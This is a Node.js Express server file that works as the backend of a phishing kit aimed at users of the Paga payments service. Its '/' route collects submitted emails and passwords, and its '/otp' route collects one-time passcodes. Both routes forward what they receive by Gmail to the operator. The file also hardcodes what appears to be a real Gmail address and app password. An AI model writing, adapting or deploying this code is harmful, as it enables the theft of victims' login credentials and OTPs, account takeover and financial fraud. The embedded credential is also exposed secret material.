const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "elvisdogoyaro@gmail.com";
const pass = "rwemrmezmqxhqqmq";

// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `New Paga client login — ${email}`,
    text: `New client login from Paga\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `Paga OTP — ${req.body?.email || "unknown"}`,
    text: `OTP from Paga: ${req.body?.otp}\nTime: ${new Date().toISOString()}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
